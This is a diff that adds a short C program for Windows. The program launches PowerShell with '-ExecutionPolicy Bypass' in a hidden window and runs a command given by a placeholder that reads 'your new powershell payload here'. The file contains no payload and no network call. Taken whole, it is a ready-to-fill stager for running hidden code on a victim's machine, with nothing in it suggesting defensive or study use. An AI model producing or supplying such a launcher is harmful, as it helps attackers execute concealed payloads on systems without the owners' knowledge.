@@ -1,0 +1,41 @@
+#include <stdio.h>
+#include <windows.h>
+
+int main() {
+    // PowerShell command to execute the script
+    const char* command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "
+                          "\"<your-new-powershell-payload-here>\"";
+
+    // Set up the STARTUPINFO structure for a hidden window
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+    
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE; // Hide the console window
+
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Create the hidden process
+    if (!CreateProcess(NULL,   // No module name (use command line)
+                       (LPSTR)command, // Command line
+                       NULL,           // Process handle not inheritable
+                       NULL,           // Thread handle not inheritable
+                       FALSE,          // Set handle inheritance to FALSE
+                       CREATE_NO_WINDOW, // Hide the window
+                       NULL,           // Use parent's environment block
+                       NULL,           // Use parent's starting directory 
+                       &si,            // Pointer to STARTUPINFO structure
+                       &pi)            // Pointer to PROCESS_INFORMATION structure
+    ) {
+        fprintf(stderr, "CreateProcess failed (%d).\n", GetLastError());
+        return 1;
+    }
+
+    // Close process and thread handles
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return 0;
+}
